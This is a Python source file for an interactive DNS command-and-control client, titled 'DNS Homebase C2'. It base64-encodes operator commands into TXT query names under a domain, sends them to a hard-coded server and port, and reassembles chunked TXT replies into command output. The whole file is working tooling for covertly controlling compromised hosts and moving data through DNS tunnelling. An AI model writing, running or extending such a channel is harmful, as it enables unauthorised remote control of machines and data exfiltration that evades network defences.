import base64
import time
from dnslib import DNSRecord

DNS_SERVER = "192.168.10.26"
DNS_PORT = 5300
DOMAIN = "ext.dom.com"

class DnsHomebase:
    
    def __init__(self, server, port, domain):
        self.server = server
        self.port = port
        self.domain = domain

    def send_command(self, cmd):
        encoded_cmd = base64.b64encode(cmd.encode()).decode()
        labels = [encoded_cmd[i:i+50] for i in range(0, len(encoded_cmd), 50)]
        query_name = ".".join(labels) + f".{self.domain}"

        print(f"[>] Sending query: {query_name}")

        q = DNSRecord.question(query_name, qtype="TXT")
        response = q.send(self.server, self.port, timeout=3)
        reply = DNSRecord.parse(response)

        first_txt = str(reply.rr[0].rdata).strip('"')
        print(f"[+] Received: {first_txt}")

        chunks = {}

        if first_txt.startswith("part-"):
            try:
                part_info, data = first_txt.split(":", 1)
                part_id = int(part_info.split("-")[1]) - 1
                total_parts = int(part_info.split("-")[3])
                chunks[part_id] = data
            except Exception as e:
                print(f"[!] Failed to parse first chunk: {e}")
                return

            for i in range(1, total_parts):
                try:
                    time.sleep(0.5)
                    q = DNSRecord.question(f"{i}.{self.domain}", qtype="TXT")
                    response = q.send(self.server, self.port, timeout=3)
                    reply = DNSRecord.parse(response)
                    txt = str(reply.rr[0].rdata).strip('"')
                    print(f"[+] Received: {txt}")

                    if not txt.startswith("part-"):
                        print(f"[!] Skipping unexpected response: {txt}")
                        continue

                    part_info, data = txt.split(":", 1)
                    part_id = int(part_info.split("-")[1]) - 1
                    chunks[part_id] = data
                    
                except Exception as e:
                    print(f"[!] Failed to get chunk {i}: {e}")

            try:
                ordered = "".join(chunks[i] for i in sorted(chunks.keys()))
                decoded = base64.b64decode(ordered.encode()).decode()
                print(f"\n[+] Final Output:\n{decoded}")
                
            except Exception as e:
                print(f"[!] Failed to decode full output: {e}")
        else:
            print(f"\n[+] Output:\n{first_txt}")

# 🧠 Main entry point (outside class)
if __name__ == "__main__":
    
    print("[+] DNS Homebase C2 — Interactive Mode")
    dns = DnsHomebase(DNS_SERVER, DNS_PORT, DOMAIN)

    try:
        while True:
            cmd = input("dns-c2> ").strip()
            
            if cmd.lower() in ("exit", "quit"):
                print("[-] Exiting...")
                break
                
            elif cmd:
                dns.send_command(cmd)
                
    except KeyboardInterrupt:
        print("\n[-] Session ended by user.")
